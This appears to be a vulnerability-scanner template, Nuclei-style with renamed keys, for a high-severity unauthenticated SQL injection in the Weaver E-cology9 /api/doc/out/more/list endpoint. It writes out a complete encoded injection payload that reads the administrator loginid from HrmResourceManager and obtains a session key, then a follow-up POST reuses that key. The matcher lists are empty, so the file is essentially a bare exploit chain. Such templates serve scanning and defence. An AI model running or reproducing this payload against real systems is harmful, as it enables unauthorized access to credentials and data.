id: weaver-ecology9-doc-list-sqli
brief:
    title: Weaver E-cology9 api/doc/out/more/list SQL Injection
    by: DhiyaneshDk
    level: high
    about: Weaver E-cology9 contains a SQL injection vulnerability in the `/api/doc/out/more/list` endpoint. A crafted request can trigger backend SQL execution and generate a temporary `sessionkey`, which ca...
    label:
        - weaver
        - ecology
        - ecology9
        - sqli
        - unauth
moves:
    - verb: GET
      to:
        - '{{BaseURL}}/api/doc/out/more/list?isNew=1&elementmore=%7B%22srcType%22%3A%20%222%22%2C%20%22srcContent%22%3A%20%22%2A%2F%3D%28%28-1%22%2C%20%22perpage%22%3A%20%2210%22%7D&docarchivedatefrom=a%27OR-1%2F%2Aa&doccreatedatefrom=%2A%2F%3D%28%2F%2Aa&doclastmoddatefrom=%2A%2FSELECT-3%2Blocate%2F%2A&docarchivedateto=%2A%2F%28hex%28SUBSTRING%28%2F%2A&doccreatedateto=%2A%2Floginid%2C1%2C1%29%29%2C%27073%27%29%20%2F%2A&doclastmoddateto=%2A%2Ffrom%20HrmResourceManager%20limit%200%2C1%29%20OR-1%2F%2A'
      signs: []
    - verb: POST
      to:
        - '{{BaseURL}}/api/ec/dev/table/counts'
      head:
        Content-Type: application/x-www-form-urlencoded
      body: dataKey={{sessionkey}}
      signs: []
